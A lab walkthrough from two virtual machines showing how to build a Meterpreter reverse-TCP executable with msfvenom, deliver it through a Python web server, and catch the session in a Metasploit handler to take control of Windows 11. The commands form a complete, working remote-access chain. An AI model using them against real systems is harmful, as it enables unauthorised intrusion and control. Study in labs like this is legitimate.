# Windows 11 Meterpreter Payload Demonstration

### Objective:

Demonstrate the process of creating, delivering, and executing a malicious payload to establish remote access/control to a Windows 11 machine.

### Test Environment:

The simulated test environment consists of two virtual machines:
* **Kali Linux VM:** Acts as the attacker machine.
* **Windows 11 VM:** Serves as the target machine.

### Tools:

* **VMware**
* **Kali Linux**
* **Metasploit**


## Steps

### 1. Obtain host IP address

```
ifconfig
```

### 2. Payload Creation with MSFvenom

MSFvenom is a component of the Metasploit framework used to create payloads for the exploitation of target devices.

The payload created will execute as an `.exe` file named “plague”. The `plague.exe` file is configured with the Kali Linux machine’s IP (LHOST) and listening port (LPORT). When executed in the target machine, the file will connect to our Kali Linux machine to establish a bridge between our target and attacking machine.

**Payload Creation Command:**
``` 
msfvenom -p windows/x64/meterpreter\_reverse\_tcp \\

LHOST=<IP-ADDRESS> \\

LPORT=1122 \\

\-f exe \\

\-o plague
```
*Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*

### 3. Create Python Webserver for Payload Delivery

To transfer the malicious plague.exe file to our target, I will utilize a python server created on my local subnet. Real world scenarios would involve social engineering, cross-site scripting (XSS), phishing, etc.

**Initiate the Python 3 HTTP Server on Port 8080:**
```
python3 -m http.server 8080
```

### 4. Configuring Metasploit Handler

When our payload is deployed, our Kali Linux machine will need to be ready to accept the incoming connection from our payload. To receive the incoming connection, we will configure a Metasploit handler.

**Launch Metasploit:**
```
sudo msfconsole
```

**Initiate Handler:**

The handler will listen for incoming connections from the payload.

```
use exploit/multi/handler
```

### 5. Define Expected Payload

The handler is configured to the correct specifications of our payload and target machine. Our target machine is a Windows 11 machine running on 64-bit OS with payload communication from a meterpreter\_reverse\_tcp payload

**Set Handler Specifications:**

```
set payload windows/x64/meterpreter\_reverse\_tcp

options
```

Executing the options command will display the parameters for the handler. To ensure proper connection, we will need to configure the parameters to our plague.exe payload.

**Set the Listening Host and Port:**

```
set LHOST <ip-address>

set LPORT 1122
```
*Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*

### 6. Execute Exploit

```
exploit
```

### 7. Payload Delivery and Execution

From the Windows 11 target machine, we must navigate to our Python 3 HTTP server.

**Input Address to HTTP Server:**

```
<ip-address>:8080
```

*Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*

Click `plague.exe` to download the payload onto the target system and run the payload.

### 8. Session Confirmation and Control

Upon successful execution of the `plague.exe` payload on the Windows 11 target, a **Meterpreter session** is established on the attacking Kali Linux machine. Control has now been established - granting command-line interface (CLI) and system access to the target machine.
